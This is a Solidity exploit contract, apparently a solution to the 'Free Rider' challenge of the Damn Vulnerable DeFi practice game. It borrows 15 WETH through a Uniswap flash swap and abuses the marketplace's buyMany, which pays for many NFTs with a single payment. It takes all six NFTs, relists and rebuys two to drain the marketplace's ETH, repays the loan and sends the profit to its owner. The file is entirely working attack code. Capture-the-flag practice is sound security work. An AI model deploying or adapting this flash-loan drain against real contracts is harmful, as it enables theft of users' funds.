// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";


interface IWETH {
  function deposit() external payable;
    
  function withdraw(uint wad) external;

  function totalSupply() external view returns (uint);

  function approve(address guy, uint wad) external returns (bool);

  function transfer(address dst, uint wad) external returns (bool);

  function transferFrom(address src, address dst, uint wad) external returns (bool);

  function balanceOf(address guy) external returns (uint);
}


contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
  
  address payable owner;
  address payable uniswapPair;
  address payable marketplace;
  address weth;
  address nft;

  uint[] tokenIds = [0, 1, 2, 3, 4, 5];
  uint[] tokenIdsForSale = [0, 1];
  uint[] pricesForSale = [15 ether, 15 ether];

  address buyerContract;

  constructor(address payable _uniswapPair, address payable _marketplace, address _weth, address _nft, address _buyerContract) {
    owner = payable(msg.sender);
    uniswapPair = _uniswapPair;
    marketplace = _marketplace;
    weth = _weth;
    nft = _nft;
    buyerContract = _buyerContract;
  }


  function attack() public {
    // flash swap 15 WETH from uniswap and return 15.1 WETH
    (bool success, bytes memory data) = uniswapPair.call(abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", 15 ether, 0, address(this), bytes("123")));
    require(success, "attack failed");
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
    // got 15 WETH from uniswap
    
    // withdraw 15 ETH from 15 WETH
    IWETH(weth).withdraw(15 ether);
    
    // buy all NFTs with 15 ETH
    FreeRiderNFTMarketplace(marketplace).buyMany{ value: 15 ether }(tokenIds);
    
    // as there is still 15 ETH left in the marketplace, sell 2 NFTs to myself to take them all
    
    // approve NFT 0 and 1 for sale
    DamnValuableNFT(nft).approve(marketplace, 0);
    DamnValuableNFT(nft).approve(marketplace, 1);

    // put NFT 0 and 1 to marketplace for sale, prices are 15 ETH
    FreeRiderNFTMarketplace(marketplace).offerMany(tokenIdsForSale, pricesForSale);

    // buy back NFT 0 and 1 to get all ETH
    FreeRiderNFTMarketplace(marketplace).buyMany{ value: 15 ether }(tokenIdsForSale);
    
    // wrap 15.1 ETH to create 15.1 WETH
    IWETH(weth).deposit{value: 15.1 ether}();
    
    // return 15.1 WETH to uniswap
    IWETH(weth).transfer(uniswapPair, 15.1 ether);

    // give all NFTs to buyer contract
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 0);
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 1);
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 2);
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 3);
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 4);
    DamnValuableNFT(nft).safeTransferFrom(address(this), buyerContract, 5);

    // transfer all ETH to attacker
    owner.transfer(address(this).balance);
  }

  function onERC721Received(address, address, uint256 tokenId, bytes memory) external override returns (bytes4) {     
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}